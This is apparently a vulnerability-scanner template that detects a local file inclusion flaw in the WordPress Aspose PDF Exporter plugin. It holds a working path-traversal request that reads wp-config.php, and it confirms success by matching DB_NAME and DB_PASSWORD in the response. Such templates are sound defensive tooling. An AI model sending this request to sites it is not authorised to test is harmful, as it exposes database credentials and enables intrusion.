id: "aspose-pdf-file-download"
name: "WordPress Aspose PDF Exporter - Local File Inclusion"
severity: "high"
description: "WordPress Aspose PDF Exporter is vulnerable to local file inclusion."
tech:
  - "wordpress"
  - "php"
tags:
  - "aspose"
  - "packetstorm"
  - "wordpress"
  - "wp-plugin"
  - "lfi"
  - "vuln"
reference: "https://packetstormsecurity.com/files/131161"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/plugins/Wordpress/Aaspose-pdf-exporter/aspose_pdf_exporter_download.php?file=../../../wp-config.php"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "DB_NAME"
      - "DB_PASSWORD"
    condition: "and"
  - type: "status"
    status:
      - 200
